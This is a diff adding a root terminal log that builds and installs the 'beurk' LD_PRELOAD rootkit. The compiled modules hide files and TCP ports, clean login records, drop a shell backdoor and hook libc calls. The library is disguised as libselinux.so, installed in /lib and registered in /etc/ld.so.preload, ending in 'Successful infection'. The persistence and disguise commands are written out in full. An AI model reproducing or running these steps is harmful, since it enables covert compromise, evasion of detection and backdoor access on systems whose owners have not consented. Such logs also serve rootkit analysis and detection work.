@@ -1,0 +1,40 @@
+root@sensor(rw):~/beurk# make && make infect
+./reconfigure beurk.conf
+./reconfigure: 'includes/config.h' correctly created
+./reconfigure: 'src/config.c' correctly created
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/init.c -o obj/init.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/config.c -o obj/config.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/debug.c -o obj/debug.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/is_hidden_file.c -o obj/is_hidden_file.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/is_attacker.c -o obj/is_attacker.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/is_procnet.c -o obj/is_procnet.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/hide_tcp_ports.c -o obj/hide_tcp_ports.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/cleanup_login_records.c -o obj/cleanup_login_records.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/drop_shell_backdoor.c -o obj/drop_shell_backdoor.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/hooks/access.c -o obj/hooks/access.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/hooks/rmdir.c -o obj/hooks/rmdir.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/hooks/fopen.c -o obj/hooks/fopen.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/hooks/fopen64.c -o obj/hooks/fopen64.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/hooks/readdir.c -o obj/hooks/readdir.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/hooks/lstat.c -o obj/hooks/lstat.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/hooks/__lxstat.c -o obj/hooks/__lxstat.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/hooks/lstat64.c -o obj/hooks/lstat64.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/hooks/__lxstat64.c -o obj/hooks/__lxstat64.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/hooks/open.c -o obj/hooks/open.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/hooks/link.c -o obj/hooks/link.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/hooks/unlink.c -o obj/hooks/unlink.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/hooks/unlinkat.c -o obj/hooks/unlinkat.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/hooks/stat.c -o obj/hooks/stat.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/hooks/__xstat.c -o obj/hooks/__xstat.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/hooks/stat64.c -o obj/hooks/stat64.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/hooks/__xstat64.c -o obj/hooks/__xstat64.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/hooks/accept.c -o obj/hooks/accept.o
+cc -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE -fPIC -g -O0 -c src/hooks/readdir64.c -o obj/hooks/readdir64.o
+cc -fPIC -shared -Wl,-soname,libselinux.so  obj/init.o  obj/config.o  obj/debug.o  obj/is_hidden_file.o  obj/is_attacker.o  obj/is_procnet.o  obj/hide_tcp_ports.o  obj/cleanup_login_records.o  obj/drop_shell_backdoor.o  obj/hooks/access.o  obj/hooks/rmdir.o  obj/hooks/fopen.o  obj/hooks/fopen64.o  obj/hooks/readdir.o  obj/hooks/lstat.o  obj/hooks/__lxstat.o  obj/hooks/lstat64.o  obj/hooks/__lxstat64.o  obj/hooks/open.o  obj/hooks/link.o  obj/hooks/unlink.o  obj/hooks/unlinkat.o  obj/hooks/stat.o  obj/hooks/__xstat.o  obj/hooks/stat64.o  obj/hooks/__xstat64.o  obj/hooks/accept.o  obj/hooks/readdir64.o \
+        -lc -lutil -lpam -lgcov -ldl -o libselinux.so
+strip --strip-unneeded -R .note -R .comment libselinux.so
+Install in /lib/libselinux.so
+install -d /lib
+install -m 755 libselinux.so /lib/
+echo /lib/libselinux.so >> /etc/ld.so.preload
+Successful infection
